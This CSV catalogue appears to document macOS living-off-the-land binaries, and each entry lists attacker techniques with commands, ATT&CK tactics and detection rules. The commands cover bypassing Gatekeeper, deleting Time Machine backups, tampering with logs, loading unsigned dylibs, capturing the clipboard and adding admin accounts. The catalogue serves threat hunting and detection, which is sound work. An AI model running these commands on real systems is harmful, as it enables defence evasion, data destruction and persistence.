"name","author","short_description","full_description","created","example_use_cases","example_use_cases_name","example_use_cases_description","example_use_cases_code","example_use_cases_tactics","example_use_cases_tags","paths","detections","detections_name","detections_url","resources","resources_name","resources_url","acknowledgements","is_legit"
"xattr","Jason Trost (@jason_trost)","Display and manipulate extended attributes.","The xattr command can be used to display, modify or remove the extended attributes of one or more files, including directories and symbolic links.  Extended attributes are arbitrary metadata stored with a file, but separate from the filesystem attributes (such as modification time or file size).  The metadata is often a null-terminated UTF-8 string, but can also be arbitrary binary data.  xattr can be used to bypass Gatekeeper.","2023-04-20","","[''Bypass Gatekeeper via xattr''-|-''Bypass Gatekeeper via xattr'']","[''Use xattr to remove quaratine extended attribute from a file.''-|-''Use xattr to remove quaratine extended attribute from multiple files or directories.'']","[''xattr -d com.apple.quarantine FILE''-|-''xattr -d -r com.apple.quarantine *'']","[''Execution''-|-''Defense Evasion''-|-''Execution''-|-''Defense Evasion'']","[''xattr''-|-''quarantine''-|-''xattr''-|-''quarantine'']","/usr/bin/xattr","","[''Gatekeeper Bypass via Xattr''-|-''Jamf Protect: Detect activity related to xattr and extended attributes'']","[''https://github.com/SigmaHQ/sigma/blob/master/rules/macos/process_creation/proc_creation_macos_xattr_gatekeeper_bypass.yml''-|-''https://github.com/jamf/jamfprotect/blob/main/custom_analytic_detections/xattr_extended_attributes_activity'']","","[''Threat Hunting the macOS edition Megan Carney (Report)''-|-''GrrCon 2018: Threat Hunting the macOS edition Megan Carney'']","[''https://megancarney.com/presentations/ExternalReport_ThreatHuntingMacOS.pdf''-|-''https://www.youtube.com/watch?v=_K4gnSuDkRM&feature=youtu.be'']","","false"
"tmutil","Brendan Chamberlain (@infosecb)","Manage Time Machine backups.","A tool for managing Time Machine, the native macOS backup utility.","2023-05-01","","[''Disable Time Machine''-|-''Delete a backup''-|-''Restore a backup''-|-''Tamper with system logs''-|-''Exclude path from backup'']","[''The following command disables Time Machine. An attacker can use this to prevent backups from occurring.''-|-''The following command deletes the specified backup. An adversary may perform this action before launching a ransonware attack to prevent the victim from restoring their files.''-|-''The following command restore the specified backup. An attacker can use this to restore a backup of a sensitive file that was deleted.''-|-''An adversary can use the snapshot and restore commands together to tamper with system logs. This is fixed in macOS 10.15.4+.''-|-''An adversary could exclude a path from Time Machine backups to prevent certain files from being backed up.'']","[''tmutil disable''-|-''tmutil delete /path/to/backup''-|-''tmutil restore /path/to/backup''-|-''mkdir /tmp/snapshot tmutil localsnapshot tmutil listlocalsnapshots / mount_apfs -o noowners -s com.apple.TimeMachine.2023-05-01-090000.local /System/Volumes/Data /tmp/snapshot open /tmp/snapshot sudo vim /var/log/system.log tmutil restore com.apple.TimeMachine.2023-05-01-090000.local''-|-''tmutil addexclusion /path/to/exclude'']","[''Impact''-|-''Impact''-|-''Collection''-|-''Privilege Escalation''-|-''Defense Evasion'']","[''backup''-|-''delete''-|-''restore''-|-''unprivileged''-|-''backup'']","/usr/bin/tmutil","","[''Jamf Protect: Detect the deletion of localsnapshots''-|-''Sigma: Time Machine Backup Deletion Attempt Via Tmutil - MacOS''-|-''Sigma: Time Machine Backup Disabled Via Tmutil - MacOS''-|-''Sigma: New File Exclusion Added To Time Machine Via Tmutil - MacOS'']","[''https://github.com/jamf/jamfprotect/blob/main/custom_analytic_detections/tmutil_activity''-|-''https://github.com/SigmaHQ/sigma/blob/master/rules/macos/process_creation/proc_creation_macos_tmutil_delete_backup.yml''-|-''https://github.com/SigmaHQ/sigma/blob/master/rules/macos/process_creation/proc_creation_macos_tmutil_disable_backup.yml''-|-''https://github.com/SigmaHQ/sigma/blob/master/rules/macos/process_creation/proc_creation_macos_tmutil_exclude_file_from_backup.yml'']","","[''mount_apfs TCC bypass and privilege escalation''-|-''Manage Time Machine backups''-|-''Living-off-the-Land: Exploring macOS LOOBins and Crafting Detection Rules - tmutil'']","[''https://theevilbit.github.io/posts/cve_2020_9771/''-|-''https://github.molgen.mpg.de/pages/bs/macOSnotes/mac/mac_files_tmutil.html''-|-''https://danielcortez.substack.com/p/living-off-the-land-exploring-macos-0fd'']","","false"
"textutil","ezaspy","Manipulate text files in various formats.","The textutil binary is a command-line utility included in macOS that allows users to manipulate text files of various formats, using the mechanisms provided by the Cocoa text system. Formats include rtf, html, docx and others","2023-05-05","","[''Use the textutil to read several files and build a new file''-|-''Capture clipboard content'']","[''A one-liner can load the content of multiple RTF files in a directory, concatenate their contents, and write the results out as a new file. This provides two sub-use-cases; one is building a malicious file from a collection of smaller files which could evade both network and host-based security controls as the traditional means of signature-based detection would be redundant; two is concatenating the content of several, potentially sensitive files before exfiltration. This command can also be looped to iterate a directory of files.''-|-''By leveraging another command line tool, pbpaste, it is possible to write a one-liner which captures the content of the clipboard. If an attacker already has access to the system, the attacker could run this command to obtain sensitive information such as a password and then elevate their privileges or exfiltrate the information.'']","[''textutil -convert html Quote.doc secondQuote.doc''-|-''pbpaste | textutil -stdin -info > Clipboard.txt'']","[''Defense Evasion''-|-''Collection''-|-''Credential Access''-|-''Collection'']","[''bash''-|-''oneliner''-|-''textutil''-|-''bash''-|-''oneliner''-|-''textutil''-|-''pbpaste''-|-''clipboard'']","/usr/bin/textutil","","Command Line Argument Detection (args contain textutil AND (-convert OR -stdin OR pbpaste))","n/a","","textutil","https://osxdaily.com/tag/textutil/","","false"
"tclsh","Brendan Chamberlain (@infosecB)","Run Tcl files or shell commands from standard input.","tclsh is a shell-like utility that runs Tcl from standard input or a file. tclsh holds the ""com.apple.security.cs.disable-library-validation"" entitlement and is capable of loading arbitary plug-ins, framework, and libraries without requiring signed code.","2023-05-17","","Execute malicious dynamic library (.dylib) from standard input","An attacker can execute a malicious .dylib from stdin by echoing a load command and piping to tclsh. This will bypass code signing requirements.","echo ""load bad.dylib"" | tclsh","Execution","dylib","/usr/bin/tclsh","","Recommendations included in resource below. No formal detection content at this time.","https://medium.com/specter-ops-posts/dylib-loads-that-tickle-your-fancy-d25196addd8c","","Dylib Loads that Tickle your Fancy","https://medium.com/specter-ops-posts/dylib-loads-that-tickle-your-fancy-d25196addd8c","Leo Pitt (@_D00mfist)","false"
"systemsetup","Hare Sudhan (@cyb3rbuff)","Enable remote login, remote apple events for the machine","systemsetup configures certain per-machine settings typically configured in the System Preferences application. The systemsetup command requires at least ""admin"" privileges to run.","2023-08-31","","[''Enable Remote Login''-|-''Enable Remote Apple Events'']","[''systemsetup can be used to enable SSH for remote login''-|-''systemsetup can be used to enable Remote Apple Events.  Set whether the system responds to events sent by other computers (such as AppleScripts). '']","[''sudo systemsetup -setremotelogin on ''-|-''sudo systemsetup -setremoteappleevents on '']","[''Lateral Movement''-|-''Lateral Movement'']","[''ssh''-|-''configuration''-|-''configuration'']","/usr/sbin/systemsetup","","[''Command line argument detection containing (args contain systemsetup AND (-setremoteappleevents OR -setremotelogin) AND on)''-|-''Jamf Protect: Detect systemsetup activity that enables remotelogin or appleremoteevents'']","[''https://www.elastic.co/guide/en/security/current/remote-ssh-login-enabled-via-systemsetup-command.html''-|-''https://github.com/jamf/jamfprotect/blob/main/custom_analytic_detections/systemsetup_activity'']","","systemsetup man page","https://ss64.com/osx/systemsetup.html","","false"
"system_profiler","Ethan Nay","Reports system hardware and software configuration.","system_profiler reports on the hardware and software configuration of the system. It can generate plain text reports or XML reports which can be opened with System Information.app","2023-07-12","","[''Listing the available datatypes''-|-''Print hardware information''-|-''Print software information''-|-''Print the information of developer tools''-|-''Print power and battery information'']","[''List all available sub-systems to get information from.''-|-''Prints an overview of the hardware of the current machine, including its model name and serial number.''-|-''Prints an overview of the software of the current machine, including the exact macOS version number.''-|-''Prints the currently active version of the Xcode developer tools and SDK.''-|-''Prints power and battery information, including the current AC wattage and battery cycle count.'']","[''system_profiler -listDataTypes''-|-''system_profiler SPHardwareDataType''-|-''system_profiler SPSoftwareDataType''-|-''system_profiler SPDeveloperToolsDataType''-|-''system_profiler SPPowerDataType'']","[''Discovery''-|-''Discovery''-|-''Discovery''-|-''Discovery''-|-''Discovery'']","[''bash''-|-''zsh''-|-''bash''-|-''zsh''-|-''bash''-|-''zsh''-|-''bash''-|-''zsh''-|-''bash''-|-''zsh'']","/usr/sbin/system_profiler","","[''System Information Discovery Using System_Profiler''-|-''Jamf Protect: Detect system_profiler activity that gathers system information'']","[''https://github.com/SigmaHQ/sigma/blob/master/rules/macos/process_creation/proc_creation_macos_system_profiler_discovery.yml''-|-''https://github.com/jamf/jamfprotect/blob/main/custom_analytic_detections/system_profiler_activity'']","","[''macOS/binaries/system_profiler''-|-''system_profiler man page'']","[''https://macosbin.com/bin/system_profiler''-|-''https://ss64.com/osx/system_profiler.html'']","","false"
"sysctl","Cedric Owens (@cedowens)","Get macOS hardware model information.","Gets the macOS hardware information, which can be used to determine whether the target macOS host is running on a physical or virtual machine.","2023-04-20","","Use sysctl to gather macOS hardware info.","sysctl can be used to gather interesting macOS host data, including hardware information, memory size, logical cpu information, etc.","sysctl -n hw.model","Discovery","[''bash''-|-''oneliner''-|-''sysctl'']","/usr/sbin/sysctl","","Jamf Protect: Detect activity related to sysctl in an interactive shell","https://github.com/jamf/jamfprotect/blob/main/custom_analytic_detections/sysctl_activity","","Evasions: macOS","https://evasions.checkpoint.com/src/MacOS/macos.html","","false"
"sysadminctl","Hare Sudhan (@cyb3rbuff)","Create/delete local accounts, guest account, enable SMB/AFP Guest access.","sysadminctl can administer system user accounts. sysadminctl can be used to change user passwords, create new  users (including automatically provisioning the user home folder) or to check the status of a user's SecureToken.","2024-11-19","","[''Enable Guest Account''-|-''Create Local User Account''-|-''Create a Local Admin Account''-|-''Reset user password''-|-''Delete a local account''-|-''Enable SMB Guest Access''-|-''Enable AFP Guest Access'']","[''sysadminctl can be used to enable the guest account''-|-''sysadminctl can be used to create a local user account''-|-''sysadminctl can be used to create a local admin account''-|-''sysadminctl can be used to reset password for a particular user account''-|-''sysadminctl can delete the specified user account''-|-''sysadminctl can enable SMB Guest Access''-|-''sysadminctl can enable AFP Guest Access'']","[''sudo sysadminctl -guestAccount on ''-|-''sudo sysadminctl -addUser randomUser -password ""randomPassword"" ''-|-''sudo sysadminctl -addUser randomUser -password ""randomPassword"" -admin ''-|-''sudo sysadminctl -resetPasswordFor randomUser -newPassword ""randomPassword"" ''-|-''sudo sysadminctl -deleteUser randomUser ''-|-''sudo sysadminctl -smbGuestAccess on ''-|-''sudo sysadminctl -afpGuestAccess on '']","[''Initial Access''-|-''Persistence''-|-''Persistence''-|-''Persistence''-|-''Impact''-|-''Exfiltration''-|-''Exfiltration'']","[''users''-|-''users''-|-''password''-|-''users''-|-''users'']","/usr/sbin/sysadminctl","","[''Sigma: Creation Of A Local User Account''-|-''Sigma: User Added To Admin Group Via Sysadminctl''-|-''Sigma: Guest Account Enabled Via Sysadminctl'']","[''https://github.com/SigmaHQ/sigma/blob/master/rules/macos/process_creation/proc_creation_macos_create_account.yml''-|-''https://github.com/SigmaHQ/sigma/blob/master/rules/macos/process_creation/proc_creation_macos_sysadminctl_add_user_to_admin_group.yml''-|-''https://github.com/SigmaHQ/sigma/blob/master/rules/macos/process_creation/proc_creation_macos_sysadminctl_enable_guest_account.yml'']","","sysadminctl man page","https://ss64.com/mac/sysadminctl.html","","false"
"swift","0v3rride (https://github.com/0v3rride)","Arbitrarily execute swift code from the terminal.","The swift command is an interactive environment (REPL) for Swift.","2023-12-23","","[''Execute Swift code file''-|-''Execute Swift one-liner before swift 5.8 / Xcode 14.3 Beta 1''-|-''Execute Swift one-liner with swift 5.8 / Xcode 14.3 Beta 1 or greater'']","[''Executes the Swift code that is in a .swift file''-|-''Executes a Swift one-liner by piping an echoed string into the swift command''-|-''Executes a Swift one-liner that executes the ls command to list the current directory using the -e option that was implemented in swift 5.8 / Xcode 14.3 Beta 1'']","[''swift mycode.swift''-|-''echo 'print(""loobins"")' | swift -''-|-''swift -e 'import Foundation; let process = Process(); process.executableURL = URL(fileURLWithPath:""/bin/bash""); process.arguments = [""-c"", ""ls -alh""]; let stdout = Pipe(); let stderr = Pipe(); process.standardOutput = stdout; process.standardError = stderr; try process.run(); print(String(decoding: stdout.fileHandleForReading.readDataToEndOfFile(), as: UTF8.self)); print(String(decoding: stderr.fileHandleForReading.readDataToEndOfFile(), as: UTF8.self));''']","[''Execution''-|-''Execution''-|-''Defense Evasion''-|-''Execution''-|-''Defense Evasion'']","[''swift''-|-''repl''-|-''bash''-|-''zsh''-|-''swift''-|-''repl''-|-''bash''-|-''zsh''-|-''swift''-|-''repl''-|-''bash''-|-''zsh'']","/usr/bin/swift","","[''Process & Command Line Argument Detection (process contains swift)''-|-''Jamf Protect: Detect arbitrary code execution using a swift one-liner'']","[''N/A''-|-''https://github.com/jamf/jamfprotect/blob/main/custom_analytic_detections/swift_oneline_command_execution'']","","[''Introduction to the Swift REPL''-|-''Scripting and Compiling Swift on the Command Line''-|-''Scripting in Swift is Pretty Awesome''-|-''Swift -e runs code directly from the command line''-|-''Swift Programming From The Command Line'']","[''https://developer.apple.com/swift/blog/?id=18''-|-''https://jblevins.org/log/swift''-|-''https://krakendev.io/blog/scripting-in-swift''-|-''https://blog.eidinger.info/swift-e-runs-code-directly-from-the-command-line''-|-''https://ed.com/command-line-swift/'']","","false"
"sw_vers","Eliott (@Koyiott)","Prints macOS version information.","sw_vers prints macOS version information, including the exact macOS version number.","2023-09-11","","[''Retrieving macOS Version Information''-|-''Retrieving macOS Product Version''-|-''Retrieving macOS Product Name''-|-''Retrieving macOS Build Version'']","[''Fetch detailed macOS version information including the build version, product name, and product version.''-|-''Fetch macOS product version.''-|-''Fetch detailed macOS product name.''-|-''Fetch detailed macOS build version.'']","[''sw_vers''-|-''sw_vers -productVersion''-|-''sw_vers -productName''-|-''sw_vers -buildVersion'']","[''Discovery''-|-''Discovery''-|-''Discovery''-|-''Discovery'']","[''bash''-|-''configuration''-|-''bash''-|-''configuration''-|-''bash''-|-''configuration''-|-''bash''-|-''configuration'']","/usr/bin/sw_vers","","No detections at time of publishing","N/A","","[''macOS/binaries/sw_vers''-|-''sw_vers man page'']","[''https://macosbin.com/bin/sw_vers''-|-''https://ss64.com/osx/sw_vers.html'']","","false"
